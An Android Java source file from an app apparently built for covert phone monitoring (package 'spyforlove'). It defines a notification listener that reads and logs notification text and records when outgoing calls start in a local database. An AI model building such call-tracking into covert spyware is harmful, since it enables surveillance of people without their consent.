package chem.kth.spyforlove.services;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.util.Date;

import chem.kth.MainApplication;
import chem.kth.spyforlove.broadcast.CallReceiver;
import chem.kth.spyforlove.database.DatabaseHelper;
import chem.kth.spyforlove.database.SharePrefUtils;
import chem.kth.spyforlove.model.PhoneCall;

public class NotificationListener extends NotificationListenerService {
    private static final String OUT_GOING = "Ongoing call";
    private static final String DIALING = "Dialing";
    private static final String TAG = NotificationListener.class.getName();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {

        if (!SharePrefUtils.getInstance().isIncomingState()) {
            Bundle extras = sbn.getNotification().extras;
            Log.d(TAG, "onNotificationPosted: "+extras.getString(Notification.EXTRA_TEXT));
            if (OUT_GOING.equals(extras.getString(Notification.EXTRA_TEXT))) {
                DatabaseHelper helper = DatabaseHelper.getInstance();
                PhoneCall phoneCall = helper.getLastOrOnePhoneCall(null);
                phoneCall.setStart_date(new Date());
                CallReceiver phoneCallReceiver = new CallReceiver();
                phoneCallReceiver.onOutgoingCallAnswered(MainApplication.getContext(), phoneCall);
            } else if (DIALING.equals(extras.getString(Notification.EXTRA_TEXT))) {
                System.out.println("phone calling");
            }
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
    }
}